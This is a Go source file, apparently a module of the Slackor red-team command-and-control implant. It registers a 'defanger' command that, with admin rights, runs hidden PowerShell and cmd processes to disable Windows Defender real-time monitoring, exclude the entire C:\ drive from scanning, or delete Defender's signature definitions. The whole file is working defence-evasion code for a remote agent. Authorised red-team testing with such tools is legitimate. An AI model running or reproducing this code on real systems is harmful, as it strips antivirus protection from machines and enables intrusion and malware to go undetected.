// +build windows

package windows

import (
	"os/exec"
	"syscall"

	"errors"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Defanger stops real-time monitoring or adds a C:\ exclusion or deletes signatures
type Defanger struct{}

// Name is the name of the command
func (d Defanger) Name() string {
	return "defanger"
}

// Run stops real-time monitoring or adds a C:\ exclusion or deletes signatures
func (d Defanger) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("defanger takes 1 argument")
	}
	mode := args[0]
	if checkForAdmin() {
		switch mode {
		case "realtime":
			cmdName := "powershell.exe"
			cmdRT := exec.Command(cmdName)
			cmdArgs := []string{"Set-MpPreference -DisableRealtimeMonitoring $true"}
			cmdRT = exec.Command(cmdName, cmdArgs...)
			cmdRT.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err := cmdRT.Run()
			if err != nil {
				return "", err
			}
		case "exclusion":
			cmdName := "powershell.exe"
			cmdE := exec.Command(cmdName)
			cmdEArgs := []string{"Add-MpPreference -ExclusionPath C:\\"}
			cmdE = exec.Command(cmdName, cmdEArgs...)
			cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err := cmdE.Run()
			if err != nil {
				return "", err
			}
		case "signatures":
			cmdName := "cmd.exe"
			cmdS := exec.Command(cmdName)
			cmdArgs := []string{"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true"}
			cmdS = exec.Command(cmdName, cmdArgs...)
			cmdS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err := cmdS.Run()
			if err != nil {
				return "", err
			}
		}
		return "Attempted to defang.", nil
	} else {
		return "", errors.New("agent is not running as high integrity")
	}
}

func init() {
	command.RegisterCommand(Defanger{})
}
